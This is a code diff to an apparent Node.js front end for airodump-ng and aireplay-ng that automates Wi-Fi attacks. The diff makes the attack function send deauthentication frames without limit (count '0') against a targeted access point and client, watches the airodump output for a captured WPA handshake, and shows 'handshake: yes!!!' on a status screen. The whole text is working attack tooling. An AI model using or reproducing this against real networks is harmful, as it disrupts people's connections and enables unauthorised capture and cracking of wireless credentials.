@@ -6,6 +6,7 @@ const EventEmitter = require('events').EventEmitter;
 
 const IFace = require('./interface');
 const aireplay = require('./aireplay-ng');
+const ctrls = require('./controls');
 
 /*
 
@@ -46,7 +47,9 @@ function parse(str) {
     'BSSID STATION PWR Rate Lost Frames Probe'
   ];
 
-  let result = {},
+  let result = {
+    handshake: null
+  },
     headLine = '',
     headChunks = [],
     headPrefix;
@@ -60,7 +63,8 @@ function parse(str) {
     if (lines[i].match(/Elapsed/)) {
       let chunks = lines[i].split('][');
       if (chunks[chunks.length - 1].match(/handshake/)) {
-        result.handshake = chunks[chunks.length - 1].match(/([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/)[0];
+        const handsh = chunks[chunks.length - 1].match(/([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})/);
+        result.handshake = handsh && handsh[0] || result.handshake;
       }
       continue;
     }
@@ -236,6 +240,7 @@ self.on('data', (data) => {
 self.attack = () => {
 
   const station = self.data.getCurrentStation();
+  let handshake = null;
 
   if (!Object.keys(station).length) {
     return;
@@ -270,13 +275,32 @@ self.attack = () => {
     '-c', station.CH
   ).then((airodump) => {
 
+    airodump.on('data', data => {
+      handshake = data.handshake || handshake;
+    });
+
     // aireplay-ng --deauth 10 -a 64:66:B3:45:C7:F4 -c DC:85:DE:3A:53:BD  mon0
     return aireplay.run(self.iface,
-      '--deauth', '100000',
+      '--deauth', '0',
       '-a', station.BSSID,
       '-c', station.MAC
     );
-  });
+  }).then((aireplay) => aireplay.on('data', (item) => {
+
+    //console.log(item);
+
+    ctrls.render([
+      {'handshake:': handshake ? 'yes!!!' :'no'},
+      {'ESSID:': station.ESSID},
+      {'BSSID:': station.BSSID},
+      {'STATION:': station.MAC},
+      {'CHANNEL:': station.CH},
+      {'STATUS:': item.STATUS},
+      {'ACKs:': item.ACKs}
+    ], [
+      `    b = back   q = quit`,
+    ]);
+  }));
 
 };
 
